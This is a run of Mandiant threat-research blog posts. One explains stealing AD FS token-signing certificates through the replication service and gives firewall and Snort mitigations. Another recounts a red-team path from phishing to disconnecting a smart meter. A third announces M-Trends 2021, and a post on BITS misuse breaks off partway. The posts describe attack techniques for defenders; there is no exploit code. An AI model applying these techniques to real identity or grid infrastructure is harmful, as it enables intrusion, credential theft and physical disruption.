http://www.fireeye.com/blog/threat-research/2021/04/espionage-group-unc1151-likely-conducts-ghostwriter-influence-activity.html2021-04-28T10:00:00.000Z2021-04-28T15:18:45.859ZAbusing Replication: Stealing AD FS Secrets Over the Networknoemail@noemail.orgDouglas Bienstock<p>Organizations are increasingly adopting cloud-based services such as
  Microsoft 365 to host applications and data. Sophisticated threat
  actors are catching on and Mandiant has observed an increased focus on
  long-term persistent access to Microsoft 365 as one of their primary
  objectives. The focus on developing novel and hard to detect methods
  to achieve this goal was highlighted with the recent detection of <a
    href="/content/fireeye-www/en_US/blog/threat-research/2021/01/remediation-and-hardening-strategies-for-microsoft-365-to-defend-against-unc2452.html">UNC2452
    and their access to Microsoft 365</a>. One of this group's key TTPs
  was to steal the Token Signing Certificate from an organization’s AD
  FS server to enable them to bypass MFA and access cloud services as
  any user, at any time. While defenders previously associated the
  defense of this certificate, and thus the entire ecosystem, with
  careful access control and detection efforts around the AD FS server
  and service account, this is no longer sufficient. In this blog post
  we will show how a threat actor, with the right privilege, can extract
  the encrypted Token Signing Certificate from anywhere on the internal
  network. Once extracted, a threat actor can easily decrypt it and
  begin accessing cloud services.</p>
 <h4>Active Directory Federation Services</h4>
 <p>Active Directory Federation Services (AD FS) is a feature for
  Windows Servers that <a
    href="https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview">enables
    federated identity and access management</a>. It is often used by
  organizations to provide single sign-on functionality to access
  enterprise applications such as Microsoft 365. In technical terms, AD
  FS functions as an <b>Identity Provider </b>(IdP) and Microsoft 365 is
  a <b>Service Provider </b>(SP). We’ll use Microsoft 365 as an example
  going forward, but this technique could apply to any service that is
  set up to trust AD FS. AD FS verifies a user’s identity and issues
  assertions that describe the user. Microsoft 365  trusts AD FS to
  verify user identities and provide it with assertions. To Microsoft
  365, it doesn’t matter how AD FS performed the verification, it just
  needs the assertions.</p>
 <p>In the typical deployment (Figure 1), AD FS will verify a user’s
  identity using Active Directory. At a minimum, an AD FS deployment
  consists of two servers in an enterprise’s on-premises network: the
  primary AD FS server, and an AD FS Web Application Proxy (WAP). The
  proxy is placed in the DMZ and has no functionality besides proxying
  sign-on attempts from the Internet to the AD FS server. The primary AD
  FS server receives proxied requests, verifies a user’s identity, and
  issues assertions that are packaged into SAML security tokens for the user.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/adfs-replication/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Typical AD FS deployment
    (source: <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/best-practices-securing-ad-fs">Microsoft</a>)</span></p>
 <p>The <a href="https://tools.ietf.org/html/rfc7522">SAML token</a>
  issued by AD FS proves a user’s identity to Microsoft 365 and can also
  be used to make authorization decisions. The SAML token is an XML
  document with two main components:</p>
 <ol> <li>
    <b>Assertions</b>: Assertions are XML elements that describe the
    user’s identity. An assertion could be a user SID, group membership
    SIDs, or other elements like the user’s department name. A single
    SAML token can have multiple assertions attached to it.</li> <li>
    <b>Digital Signature</b>: The assertions in the SAML token are
    digitally signed using a public/private keypair that resides on the
    AD FS server. This is called the Token Signing Certificate.</li> </ol>
 <p>
  <b>The Token Signing Certificate is the bedrock of security in AD
  FS.</b> Microsoft 365 uses the digital signature to validate that the
  SAML token is authentic, valid, and comes from an AD FS server that it
  trusts. To enable this verification, an administrator shares the
  public component of the Token Signing Certificate with Microsoft 365.
  This is then used to cryptographically verify the digital signature in
  the SAML token and prove authenticity as well as integrity of the
  token. In other words, if a threat actor got hold of a Token Signing
  Certificate, they could generate arbitrary SAML tokens to access any
  federated application, as any user, and even bypass MFA.</p>
 <h4>Golden SAML</h4>
 <p>Golden SAML was coined in 2017 by CyberArk to describe the technique
  of <a
    href="https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps">forging
    SAML tokens to access SPs</a> given a valid Token Signing
  Certificate. At <a
    href="https://www.youtube.com/watch?v=5dj4vOqqGZw">TROOPERS 19</a>,
  I detailed how a threat actor could extract the Token Signing
  Certificate from an AD FS server, as well as some mitigation
  strategies for defenders.</p>
 <p>In a default AD FS configuration, the Token Signing Certificate is
  stored within a Windows Internal Database (WID) instance that is
  running on the AD FS server. WID is more or less MS SQL Express,
  except the database can only be accessed locally over a special named
  pipe connection. In AD FS, the database is further locked down to only
  the AD FS service account. The Token Signing Certificate is stored in
  an encrypted state in the <span
  class="code">IdentityServerPolicy.ServiceStateSummary</span> table.
  Figure 2 contains a single row with a column that stores all the
  settings that AD FS will need on service start as an XML document.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">&lt;SigningToken&gt;<br />             
          &lt;IsChainIncluded&gt;false&lt;/IsChainIncluded&gt;<br />   
                   
          &lt;IsChainIncludedSpecified&gt;false&lt;/IsChainIncludedSpecified&gt;<br />
                     
          &lt;FindValue&gt;99FABAEE46A09CD9B34B9510AB10E2B0C0ACB99B&lt;/FindValue&gt;<br />
                     
          &lt;RawCertificate&gt;&lt;/RawCertificate&gt;<br />           
            &lt;EncryptedPfx&gt;&lt;/EncryptedPfx&gt;<br />             
          &lt;StoreNameValue&gt;My&lt;/StoreNameValue&gt;<br />         
             
          &lt;StoreLocationValue&gt;CurrentUser&lt;/StoreLocationValue&gt;<br />
                     
          &lt;X509FindTypeValue&gt;FindByThumbprint&lt;/X509FindTypeValue&gt;<br />
                  &lt;/SigningToken&gt;</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 2: Example Token Signing Certificate
    stored in the AD FS database</span></p>
 <p>The Token Signing Certificate as it is stored in the AD FS database
  is encrypted using symmetric key encryption. Windows uses a technology
  called Distributed Key Management (DKM) to store the secret value used
  to derive the symmetric key in an Active Directory container. The AD
  FS service account can read the attributes of this container, derive
  the symmetric key, and then decrypt the Token Signing Certificate.</p>
 <h4>AD FS Replication</h4>
 <p>AD FS also supports a farm configuration for high availability and
  load balancing in larger enterprise networks. The individual AD FS
  servers in a farm can be configured to use unique Token Signing
  Certificates; however, the default is to have the servers share the
  same Token Signing Certificate.  In order to stay in sync with each
  other, the farm will have a primary node and secondary nodes. The
  secondary nodes make use of a replication service to acquire
  configuration settings and certificates from the primary AD FS server.
  To facilitate this, AD FS makes use of Windows Communication
  Foundation (WCF).</p>
 <p>WCF is a framework that allows developers to <a
    href="https://docs.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf">build
    service-oriented applications</a>. A WCF application has two
  components: the service that will receive and process messages, and
  the client that sends messages to a service and receives back
  responses. The AD FS servers run a WCF service that is called the
    <span class="code">Policy Store Transfer Service</span> internally.</p>
 <p>To send a message to this service, the client will connect to the
  URL <span class="code">http://&lt;adfs server
  name&gt;:80/adfs/services/policystoretransfer</span>. Note that even
  though the channel is over HTTP, the actual data being exchanged is
  encrypted during transit. It is also key to understand that although
  there is a single primary AD FS server, all nodes in an AD FS farm run
  this WCF service and can be used for replication.</p>
 <p>Upon receipt of a message, the WCF service enforces an authorization
  check to ensure the calling identity is permitted to receive the
  requested information. The permission check is done by evaluating an
  authorization policy that is also stored in the <span
  class="code">IdentityServerPolicy.ServiceStateSummary</span> table of
  the AD FS database. The policy permits identities whose primary SID
  matches the AD FS Service account <i>or</i> to any identity that is
  member of the AD FS server’s local administrators group. If the
  identity of the client passes the authorization check, then the WCF
  service will send back a message containing the requested information.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">   &lt;AuthorizationPolicy&gt;<br />   
           @RuleName = “Permit Service Account”exists([Type ==<br />   
           
          “http://schemas.microsoft.com/ws/2008/06/identity/claims/<br />
              primarysid”, Value ==
          “S-1-5-21-3508695881-2242692613<br />      -376241919-1107”])
          =&gt; issue(Type = “http://schemas<br />     
          .microsoft.com/authorization/claims/permit”, Value = “<br />
              true”);<br />     @RuleName = “Permit Local
          Administrators”exists([Type ==<br />   
           “http://schemas.microsoft.com/ws/2008/06/identity/claims/group<br />
             sid”, Value == “S-1-5-32-544”])=&gt; issue(Type =
          &amp;quot<br />   
           ;http://schemas.microsoft.com/authorization/claims/permit”,
          Value<br />      = “true”);<br />   
       &lt;/AuthorizationPolicy&gt;</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 3: Default Authorization Policy for AD FS server</span></p>
 <h4>Room for Abuse</h4>
 <p>A threat actor can abuse the Policy Store Transfer Service to
  acquire the encrypted Token Signing Certificate over the network,
  similar to the DCSync technique for Active Directory. It is important
  to note that the data is still encrypted and requires the DKM key
  stored in Active Directory to decrypt. This technique, however,
  requires a significant change to how defenders have secured AD FS
  servers and monitored them for theft of the Token Signing Certificate.</p>
 <p>First, previous techniques required code execution on an AD FS
  server to extract the data or at least an SMB connection to transfer
  the backing database files. With a strong defense in depth program
  using secure credential management, EDR, and network segmentation, an
  enterprise can make it very difficult for a threat actor to access an
  AD FS server and the Token Signing Certificate. Abusing the AD FS
  Replication service, however, requires only access to the AD FS server
  over the standard HTTP port. The default installation of AD FS will
  even create a Windows Firewall rule to allow HTTP traffic from any
  system. Additionally, a threat actor does not need the credentials for
  the AD FS service account and can instead use any account that is a
  local administrator on an AD FS server. Lastly, there is no Event Log
  message that is recorded when a replication event occurs on an AD FS
  server. Altogether, this makes the technique both much easier to
  execute and much harder to detect.</p>
 <p>The authorization policy itself also presents an opportunity for
  abuse. Because the authorization policy is stored as XML text in the
  configuration database, a threat actor with enough access could modify
  it to be more permissive. A threat actor could modify the
  Authorization Policy to include a group SID such as domain users,
    <span class="code">S-1-5-21-X-513</span>. Similarly, they could add
  an ACE to the DKM key container in Active Directory. This would allow
  the threat actor to easily obtain the Token Signing Certificate and
  decrypt it using any domain user credentials. This would give them
  persistent ability to perform a Golden SAML attack with only access to
  the network as a requirement.</p>
 <p>Mandiant has not yet observed this technique used in the wild;
  however, it is trivial to write a POC for and we are aware of one
  public tool that will soon support it. Figure 4 shows the output of
  POC code written in .NET to extract the Token Signing Certificate from
  a remote AD FS server.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/adfs-replication/fig4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: POC code output</span></p>
 <h4>Mitigations</h4>
 <p>The best mitigation against this technique is to use the Windows
  Firewall to restrict access to port 80 TCP to only the AD FS servers
  in the farm. If an organization has only a single AD FS server, then
  port 80 TCP can be blocked completely. This block can be put in place
  because all traffic to and from AD FS servers and proxies for user
  authentication is over port 443 TCP.  </p>
 <p>To limit inbound communications, modify the existing firewall rule
  that AD FS inserts on installation.</p>
 <p>
  <span class="code">Set-NetFirewallRule -DisplayName &quot;AD FS HTTP
    Services (TCP-In)&quot; -RemoteAddress &lt;ADFS1 IP
    address&gt;,&lt;ADFS2 IP Address&gt;</span></p>
 <p>If no rule exists, the scriptlet in Figure 5 should be applied to
  all ADFS servers to create one.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">New-NetFirewallRule -DisplayName
          &quot;Allow ADFS Servers TCP 80&quot; -Direction Inbound
          -Action Allow  -Protocol TCP -LocalPort 80 -RemoteAddress
          &lt;ADFS1 IPAddress &gt;,&lt;ADFS2 IPAddress&gt;</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 5: Windows Firewall - Allow ADFS Server -
    TCP 80</span></p>
 <p>Organizations that are monitoring the internal network can alert on
  HTTP POST requests to the address that hosts the Policy Store Transfer
  service. If there is an AD FS farm, then the IP addresses of the AD FS
  servers will need to be whitelisted against the rule. Figure 6 shows a
  sample Snort rule to detect this activity.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">alert tcp any any -&gt; any 80
          (msg:&quot;AD FS Replication&quot;; flow:established,
          to_server; content:&quot;POST&quot;; http_method;
          content:&quot;adfs/services/policystoretransfer&quot;;
          http_uri; threshold:type limit,track by_src,count 1,seconds
          3600; priority:3; sid:7000000; rev:1;)</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 6: Sample snort rule</span></p>
 <h4>Acknowledgements</h4>
 <p>Mandiant would like to acknowledge the great work of Dr. Nestori
  Syynimaa (@DrAzureAD). Dr. Syynimaa independently thought to research
  the replication of configuration information between AD FS servers and
  has published his findings on his <a
  href="https://o365blog.com/">blog</a>. Mandiant would also like to
  thank Microsoft for their collaboration on mitigations and detections
  for this technique. Lastly, special thanks to Mike Burns of the
  Mandiant Security Transformation services team for his feedback on
  mitigations and detections.</p>
http://www.fireeye.com/blog/threat-research/2021/04/abusing-replication-stealing-adfs-secrets-over-the-network.html2021-04-27T17:00:00.000Z2021-04-27T16:54:09.830ZHacking Operational Technology for Defense: Lessons Learned From OT Red
Teaming Smart Meter Control Infrastructurenoemail@noemail.orgShishir Gupta<p>High-profile security incidents in the past decade have brought
  increased scrutiny to cyber security for operational technology (OT).
  However, there is a continued perception across critical
  infrastructure organizations that OT networks are isolated from public
  networks—such as the Internet. In Mandiant’s experience, the concept
  of an ‘air gap’ separating OT assets from external networks rarely
  holds true in practice.</p>
 <p>In 2018, we released a blog post presenting the tools and techniques
  that <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/04/triton-actor-ttp-profile-custom-attack-tools-detections.html">TEMP.Veles
    used during the TRITON incident</a> to traverse from an external
  compromise of the information technology (IT) network of a critical
  infrastructure organization to the safety systems located deep in the
  OT network. We regularly reproduce this approach in our OT-focused red
  team engagements to expose similar attack paths across client
  infrastructure and to identify environment specific opportunities to
  prevent and detect network propagation techniques across intermediary systems.</p>
 <p>In this blog post, we share another case study from one of our <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/08/hands-on-introduction-to-mandiant-approach-to-ot-red-teaming.html">OT
    Red Team</a> engagements to illustrate the tactics, techniques, and
  procedures (TTPs) that can be leveraged by sophisticated threat actors
  to breach the protected perimeter between an IT network and an OT
  network. We also examine some of the different types of critical
  information often found in IT networks that an attacker can leverage
  during later stages of the Targeted Attack Lifecycle. The goal of this
  engagement was to access an endpoint meter control infrastructure for
  a state-wide smart grid environment from the Internet and turn it off.   </p>
 <p>To hear our experts relay more on this and other OT Red Team lessons
  learned, join our <a
    href="https://www.brighttalk.com/webcast/12695/480199?utm_source=FireEye&amp;utm_medium=brighttalk&amp;utm_campaign=480199">FireEye
    Mandiant Virtual Summit session</a>.</p>
 <p>Visit our <a
  href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">website</a>
  to learn more about Mandiant’s OT security practice or contact us
  directly to request <a
    href="/content/fireeye-www/en_US/mandiant.html">Mandiant
    services</a> or <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">threat intelligence</a>.</p>
 <h4>Building the Foundation: Information Gathering for IT-OT Network Propagation</h4>
 <p>Targeted OT attacks attempting to cause physical impacts require
  planning. A sophisticated actor who is motivated to disrupt or modify
  an industrial process from a public network will necessarily need to
  maintain access to the victim environment and remain undetected for
  enough time to accomplish their objective. Throughout this time, the
  actor will strive to learn about the control process to formulate the
  attack, figure out how to pivot to the OT systems and bypass security
  controls, and sometimes even develop or deploy custom OT malware.</p>
 <p>Similar to the techniques used by TEMP.Veles to reach the OT network
  during the <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/04/triton-actor-ttp-profile-custom-attack-tools-detections.html">TRITON
  incident</a>, Mandiant’s experience during red team engagements
  highlights that collecting information from IT network assets plays a
  crucial role in targeted OT attacks. As a result, the internal
  reconnaissance phase for OT targeted attacks begins in the enterprise
  network, where the actor obtains knowledge and resources to propagate
  from an initial compromise in the IT network to remote access in the
  OT network. Detailed information collected about the target, their
  security operations, and their environment can also support an actor's
  attempts at remaining undetected while expanding operations.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/ot-lessons-learned/fig1.jpg" alt="" />
  <br /> <span class="type-XS">Figure 1: Targeted OT attack from a
    public network</span></p>
 <h4>Thinking Like an Adversary: How to Turn Off Smart Energy Meters</h4>
 <p>The ideal scenario for an attacker targeting OT systems is to
  achieve their objective while remaining undetected. Mandiant’s Red
  Team works with clients across critical infrastructure industries to
  simulate attack scenarios in which actors can accomplish this goal by
  gaining access to OT systems via compromise of external facing IT
  networks. During these engagements, we emulate real actor behaviors to
  learn about our target and to determine the best paths for IT/OT
  network propagation.</p>
 <p>For this engagement, we simulated an end-to-end OT-specific attack
  scenario in which we tested the security controls and response
  capabilities of an organization to protect smart grid meter control
  infrastructure from an external attacker. Mandiant leveraged
  weaknesses in people, process, and technology to gain remote access
  from the public Internet and to achieve a set of pre-approved
  objectives in the OT environment.</p>
 <p>
  <i>Establishing a Foothold in the IT Network</i></p>
 <p>Mandiant conducted a spear phishing exercise to gain initial access
  into the client’s enterprise network from the Internet. We defined a
  combination of two different phishing scenarios that we deployed to
  test email filtering and egress monitoring controls:</p>
 <ul> <li>Embedded link for a malicious file hosted on a Mandiant owned
    domain on the Internet</li> <li>Email attachment for a Microsoft
    Office document with auto - executable macro code</li> </ul>
 <p>This exercise allowed our team to achieve code execution on a user
  workstation in the enterprise environment and to establish an
  unattributable egress communication path to a Mandiant hosted Cobalt
  Strike Command and Control (C&amp;C) server on the Internet. After
  establishing a stable communication path with workstations in the
  enterprise environment, we utilized the following publicly available
  offensive security tools (OST) to escalate privileges and to obtain
  domain administrator level access:</p>
 <ul> <li>
    <a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a> to
    enumerate information in the enterprise domain</li> <li>
    <a
    href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>
    to exploit common security misconfigurations in IT</li> <li>
    <a
    href="https://github.com/FortyNorthSecurity/WMImplant">WMImplant</a>
    to move laterally from one system to another in the internal
  network</li> <li>
    <a href="https://github.com/gentilkiwi/mimikatz/wiki">Mimikatz</a>
    to extract credentials for local user and domain administrator
  accounts</li> </ul>
 <p>As domain administrators, we gained unrestricted access to a variety
  of resources connected to the enterprise domain (e.g. server
  resources, file shares, IT applications, and administrator consoles
  for IT systems). During the initial stages of our engagement, our
  actions were in no way different to other less sophisticated
  intrusions on industrial organizations, such as <a
  href="https://www.fireeye.com/blog/threat-research/2020/07/financially-motivated-actors-are-expanding-access-into-ot.html">financially-motivated</a> compromises.</p>
 <p>
  <i>Defining Our Path to the OT Network</i></p>
 <p>Similar to real world threat actors carrying out targeted OT
  attacks, Mandiant’s OT Red Team dedicates significant effort for
  internal reconnaissance in the IT network to develop a logical mapping
  of the extended network architecture and discover targets of interest
  (people, processes, or technology). The information we acquire helps
  us to (a) define paths to propagate from the IT to the OT network and
  (b) achieve our final objective in the OT network without raising
  alarms. During OT Red Team engagements across different industries, we
  follow a real attacker’s cost-benefit analysis to determine which
  sources or methods are most likely to help us obtain that information.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/ot-lessons-learned/fig2.jpg" alt="" />
  <br /> <span class="type-XS">Figure 2: Information sources and target
    information from enterprise networks</span></p>
 <p>For this engagement, we leveraged the domain administrator
  credentials obtained in the previous phase to gain access to Microsoft
  System Center Configuration Manager (SCCM) in the IT network. Logged
  into the SCCM console, we leveraged software deployment features for
  collection to establish C&amp;C over user workstations belonging to
  pre-selected departments in the client organization.</p>
 <p>Mandiant chose the specific groups based on the names of their
  departments and the description attributes, which suggested a high
  likelihood of member users with high privilege access for network
  infrastructure or application management. This included members of the
  following groups: network management, firewall administration, control
  engineering, and smart meter operations.</p>
 <p>Access to user workstations of target employees in these departments
  enabled us to:</p>
 <ul> <li>Capture keystrokes to obtain remote desktop protocol (RDP)
    credentials for the OT network by using a Cobalt Strike modified
  script</li> <li>Login to department file shares and extract OT system
    design documents</li> <li>Extract network design documents and
    backup files for OT firewall configurations found in the firewall
    management console</li> <li>Find plaintext credentials for OT
    management systems from operation manuals</li> </ul>
 <p>Internal reconnaissance in the IT network not only allowed us to
  obtain remote access credentials for the OT network, but to also gain
  a deeper understanding of the business processes and technical control
  system operations in the OT environment by reviewing internal
  OT-specific operational procedures and security documentation such as
  asset inventories and configurations.</p>
 <p>
  <i>Propagating to the OT Network</i></p>
 <p>During the process of propagation from IT to OT networks, an actor
  will leverage previously compromised systems, credentials, or
  applications to access systems in higher security zones—such as OT
  demilitarized zones (DMZ). Based on our observations during multiple
  red teaming engagements and research, the most likely attack vectors
  for propagation are:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/ot-lessons-learned/table1.jpg" alt="" />
  <br /> <span class="type-XS">Table 1: Most likely attack vectors for
    IT/OT propagation</span></p>
 <p>For this engagement, we initially analyzed the system architecture
  to define the best path to follow. Engineers from the target
  organization were required to use multi-factor-authentication (MFA) to
  gain remote access to jumpbox servers in the OT network. While not
  impossible, bypassing this setup would require more time and
  resources. We instead decided to search for other plausible attack
  propagation paths.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/ot-lessons-learned/fig3.jpg" alt="" />
  <br /> <span class="type-XS">Figure 3: Formal communication path from
    enterprise to OT network</span></p>
 <p>Reviewing the firewall configuration files, we identified a
  dedicated communication path for management access to a Microsoft
  Windows patch management server in a DMZ between the IT network and
  the OT network. This patch management server was running on a virtual
  machine in the DMZ network, while the administration console for the
  underlying hypervisor software itself was hosted in the IT network.</p>
 <p>Mandiant logged into the administration console for the hypervisor
  software using IT network domain administrator credentials. We then
  leveraged guest machine administration features via direct console
  access to execute commands on the patch management server in the DMZ
  network. The compromise of the patch management server in the DMZ
  allowed us to pivot via SMB connections to Microsoft Windows-based
  intermediary systems in the OT network.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/ot-lessons-learned/fig4.jpg" alt="" />
  <br /> <span class="type-XS">Figure 4: Remote attack propagation path
    from IT network to OT network</span></p>
 <p>Lastly, we compromised Microsoft Windows server systems in the OT
  network to complete the objectives of the exercise. Using OT
  credentials retrieved in the previous phases, we authenticated to the
  SMB service (using single factor authentication) by pivoting through
  the patch management server in the DMZ network. This enabled us to
  execute remote console commands on management servers (such as the
  domain controller) in the OT network.</p>
 <p>With access to the domain controller in the core OT network, we
  extracted credentials for high privilege domain administrator accounts
  in the OT network using DCSYNC and Mimikatz. Using these accounts, we
  gained control of management servers, application servers, and
  operator workstations in the OT network. Mandiant was also able to use
  compromised credentials to login to the human machine interface (HMI)
  portal for the meter control infrastructure and issue a disconnect
  command for a target endpoint meter in the smart grid environment.</p>
 <h4>Strategic Collection and Detection Opportunities During
  Reconnaissance and Network Propagation</h4>
 <p>Although specific capabilities such as malware and tooling vary
  amongst incidents, internal reconnaissance and network propagation are
  consistently needed for sophisticated adversaries to expand remote
  operations from external networks to OT systems. Focusing collection,
  detection, and hunting efforts on assets or information that are
  likely to be compromised during these phases presents defenders with
  strategic opportunities to hunt for and detect targeted adversary
  activity before it poses a risk to control systems.                   
                                                                 </p>
 <ul> <li>In a previous blog post stating our approach to OT security,
    we highlighted that IT networks close to production networks and OT
    intermediary systems remain the best zones to detect OT targeted
    attacks, a.k.a. “<a
      href="/content/fireeye-www/en_US/blog/threat-research/2019/12/fireeye-approach-to-operational-technology-security.html">The
      Funnel of Opportunity</a>”. As actors pivot across systems and
    networks to gather information and elevate privileges, they leave
    footprints that can be tracked before they propagate to critical
  systems.</li> <li>An actor who covertly performs internal
    reconnaissance and propagates to the OT network is already
    positioned to cause damage on mission critical assets and is
    unlikely to be discovered. Early detection of adversary activity
    before reaching critical OT systems will decrease the dwell time and
    the risk of an incident.</li> <li>OT defenders can prioritize
    collection and detection, alert triage, and incident response
    efforts by becoming familiar with the types of information and
    services that OT focused threat actors commonly search for during
    internal reconnaissance in IT networks and network propagation
    across OT intermediary systems.</li> <li>Understanding where this
    information resides presents defenders with a catalog of systems and
    networks to focus collection and detection efforts on. Defenders can
    create tailored detections to hunt for adversary activity pursuing
    this information, prioritize alert response efforts, and identify
    additional security controls to implement. Mandiant red teaming in
    OT can help organizations identify which data is valuable for
    attackers to support their network propagation efforts and which
    systems are most likely to be compromised by attackers targeting OT
  networks.</li> </ul>
 <p>Visit our website for <a
    href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">more
  information</a> or to request <a
    href="/content/fireeye-www/en_US/mandiant.html">Mandiant
    services</a> or <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">threat intelligence</a>.</p>
http://www.fireeye.com/blog/threat-research/2021/04/hacking-operational-technology-for-defense-lessons-learned.html2021-04-13T15:00:00.000Z2021-04-13T15:50:36.233ZM-Trends 2021: A View From the Front Linesnoemail@noemail.orgJurgen Kutscher<p>We are thrilled to launch <i>
    <a
      href="/content/fireeye-www/en_US/current-threats/annual-threat-report/mtrends.html">M-Trends
  2021</a></i>, the 12<sup>th</sup> edition of our annual FireEye
  Mandiant publication. The past year has been unique, as we witnessed
  an unprecedented combination of global events. Business operations
  shifted in response to the worldwide pandemic and threat actors
  continued to escalate the sophistication and aggressiveness of their
  attacks, while in parallel leveraged unexpected global events to their advantage.</p>
 <p>We discuss all of this and much more in the full report, which is <a
    href="/content/fireeye-www/en_US/current-threats/annual-threat-report/mtrends.html">available
    for download today</a>. But first, here is a sneak preview of the
  most popular <i>M-Trends</i> metric where we answer the critical
  question: Are organizations getting better at detecting attacks?</p>
 <p>In short, yes! Back in 2011, we reported a 416-day global median
  dwell time, indicating that attackers were operating undetected on a
  system or network for over a year on average. This time, from Oct. 1,
  2019 through Sept. 30, 2020, the median dwell time has decreased to
  only 24 days. This means—for the first time in <i>M-Trends</i>
  history—the median dwell time has dropped to under one month.</p>
 <p>Although this drop in dwell time is promising, it is critical for
  organizations to remember that cyber adversaries typically only need a
  few days to achieve their objective, such as identifying and stealing
  the crown jewels of a victim organization or launching a crippling
  ransomware attack. Organizations across the globe must remain
  vigilant, to prepare for the next incident.</p>
 <p>There is much more to unpack in the <i>M-Trends 2021 </i>report.
  Here is a quick rundown of what to expect:</p>
 <ul> <li>
    <b>By the Numbers</b>: A large and diverse set of metrics including
    attacker dwell time, detection by source, industry targeting,
    growing threat techniques, sophisticated malware families, and
  more.</li> <li>
    <b>Ransomware</b>: Front-line stories on how this harmful threat is
    evolving, challenges with recovery, and best practice hardening
    strategies to effectively combat this threat.</li> <li>
    <b>Newly Named Threat Groups</b>: More on FIN11, a financially
    motivated threat group that we promoted in 2020, which has been
    active since at least 2016 and is most recently known for operations
    involving ransomware and extortion.</li> <li>
    <b>Pandemic-Related Threats</b>: Breakdown of countless espionage
    campaigns targeting ground-breaking research in the race to learn
    more about COVID-19.</li> <li>
    <b>UNC2452/SUNBURST</b>: UNC2452’s headline-making compromise of
    environments via an implant in the SolarWinds Orion platform, mapped
    to the attack lifecycle framework with details at every stage.</li> <li>
    <b>Case Studies</b>: Mandiant engagements involving the rise of
    insider threats and how to be more prepared, plus advanced red
    teaming tactics that enabled access to executive emails without any
  exploits.</li> </ul>
 <p>For over a decade, the mission of <i>M-Trends</i> has always been
  the same: to arm security professionals with insights on the latest
  attacker activity as seen directly on the front lines, backed by
  actionable learnings to improve organizations’ security postures
  within an evolving threat landscape.</p>
 <p>Download the <a
      href="/content/fireeye-www/en_US/current-threats/annual-threat-report/mtrends.html"><i>M-Trends
    2021</i> report</a> today, and then for more information, check out
  the <a href="https://virtualsummit.fireeye.com/index.html">FireEye
    Mandiant Virtual Summit</a>. Starting today and running through
  April 15, the event includes a variety of sessions, with three related
  to <i>M-Trends</i>: one that provides an <a
    href="https://virtualsummit.fireeye.com/track-expertise.html#top-cyber-trends">overview
    of the report and highlights key topics</a>, another focused on our
    <a
    href="https://virtualsummit.fireeye.com/track-expertise.html#mtrends-2021">“By
    the Numbers” chapter</a> coupled with mitigation solutions related
  to these metrics, and one covering <a
    href="https://www.brighttalk.com/webcast/10703/479027">the report
    through a lens from the EMEA region</a>. <a
    href="https://virtualsummit.fireeye.com/index.html">Register now</a>!</p>
http://www.fireeye.com/blog/threat-research/2021/04/m-trends-2021-a-view-from-the-front-lines.html2021-04-13T13:45:00.000Z2021-04-13T13:50:48.021ZBack in a Bit: Attacker Use of the Windows Background Intelligent
Transfer Servicenoemail@noemail.orgDavid Via<table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>In this blog post we will describe:</p> <ul> <li>How
            attackers use the Background Intelligent Transfer Service
          (BITS)</li> <li>Forensic techniques for detecting attacker
            activity with data format specifications</li> <li>Public
            release of the <a
            href="https://github.com/fireeye/BitsParser">BitsParser</a>
          tool</li> <li>A real-world example of malware using BITS
          persistence</li> </ul> </td> </tr></tbody></table>
 <h4>Introduction</h4>
 <p>Microsoft introduced the Background Intelligent Transfer Service
  (BITS) with Windows XP to simplify and coordinate downloading and
  uploading large files. Applications and system components, most
  notably Windows Update, use BITS to deliver operating system and
  application updates so they can be downloaded with minimal user disruption.</p>
 <p>Applications interact with the Background Intelligent Transfer
  Service by creating jobs with one or more files to download or upload.
  The BITS service runs in a service host process and can schedule
  transfers to occur at any time. Job, file, and state information is
  stored in a local database.</p>
 <h4>How Attackers Use BITS</h4>
 <p>As is the case with many technologies, BITS can be used both by
  legitimate applications and by attackers. When malicious applications
  create BITS jobs, files are downloaded or uploaded in the context of
  the service host process. This can be useful for evading firewalls
  that may block malicious or unknown processes, and it helps to obscure
  which application requested the transfer. BITS transfers can also be
  scheduled allowing them to occur at specific times without relying on
  long-running processes or the task scheduler.</p>
 <p>BITS transfers are asynchronous, which can result in situations
  where the application that created a job may not be running when the
  requested transfers complete. To address this scenario BITS jobs can
  be created with a user-specified notification command, which will be
  executed after the job completes or in case of errors. The
  notification commands associated with BITS jobs can specify any
  executable or command to run. Attackers have utilized this feature as
  a method for maintaining persistence of malicious applications.</p>
 <p>Since the command data for BITS jobs is stored to a database rather
